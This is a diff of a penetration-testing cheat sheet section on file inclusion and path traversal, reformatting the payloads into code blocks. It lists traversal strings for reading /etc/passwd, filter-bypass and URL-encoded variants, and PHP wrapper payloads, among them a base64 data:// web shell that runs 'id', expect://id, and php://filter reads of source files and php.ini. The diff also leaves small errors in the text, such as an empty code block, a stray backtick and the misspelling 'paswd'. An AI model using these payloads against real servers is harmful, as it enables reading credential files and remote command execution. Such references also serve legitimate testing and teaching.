@@ -670,15 +670,19 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 
 #### Common
 
-`/etc/passwd`  
-`../../../../etc/passwd`
+```
+/etc/passwd  
+../../../../etc/passwd
+```
 
 #### Replace ../
 
 $language = str_replace('../', '', $_GET['file']);  
-`/....//....//....//....//etc/passwd`  
-`..././..././..././..././etc/paswd`  
-`....\/....\/....\/....\/etc/passwd`  
+```
+/....//....//....//....//etc/passwd  
+..././..././..././..././etc/paswd  
+....\/....\/....\/....\/etc/passwd 
+```
 
 #### Block . and /
 
@@ -686,20 +690,25 @@ $language = str_replace('../', '', $_GET['file']);
 
 /etc/passwd:
 
-`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`  
-`%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`
-  
+```
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```
+```
+```
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+```  
 #### PHP Wrappers
 
-`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
-`expect://id`  
-`php://filter/read=convert.base64-encode/resource=index.php`  
-`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
+```
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
+expect://id`  
+php://filter/read=convert.base64-encode/resource=index.php  
+php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+```
 
 #### Filter PHP
 
 -> Predefined Paths
-
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 `./okay/../../../../etc/passwd`  
